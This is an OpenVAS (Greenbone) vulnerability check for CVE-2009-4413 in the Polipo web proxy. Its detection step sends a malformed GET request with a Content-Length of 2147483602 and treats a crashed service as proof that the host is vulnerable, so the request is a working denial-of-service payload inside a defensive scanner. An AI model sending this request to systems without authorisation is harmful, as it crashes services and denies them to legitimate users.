###############################################################################
# OpenVAS Vulnerability Test
# $Id: polipo_37226.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Polipo Malformed HTTP GET Request Memory Corruption Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Polipo is prone to a memory-corruption vulnerability.

Successful exploits may allow remote attackers to execute arbitrary
code within the context of the affected application or crash the
application, denying service to legitimate users.

Polipo 0.9.8 and 1.0.4 are vulnerable; other versions may also
be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100379");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-12-08 12:57:07 +0100 (Tue, 08 Dec 2009)");
 script_cve_id("CVE-2009-4413");
 script_bugtraq_id(37226);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_name("Polipo Malformed HTTP GET Request Memory Corruption Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/37226");
 script_xref(name : "URL" , value : "http://www.pps.jussieu.fr/~jch/software/polipo/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 8123);
 script_mandatory_keys("Polipo/banner");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

if(safe_checks())exit(0);

port = get_http_port(default:8123);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if(!banner)exit(0);

if(egrep(pattern:"Server: Polipo", string:banner))
 {

    soc = http_open_socket(port);
    if(!soc)exit(0);

    req = string("GET / HTTP/1.1\r\nContent-Length: 2147483602\r\n\r\n");
    send(socket:soc, data:req);

    if(http_is_dead(port:port)) {
      security_message(port:port);
      exit(0);
    }  

 }

exit(0);
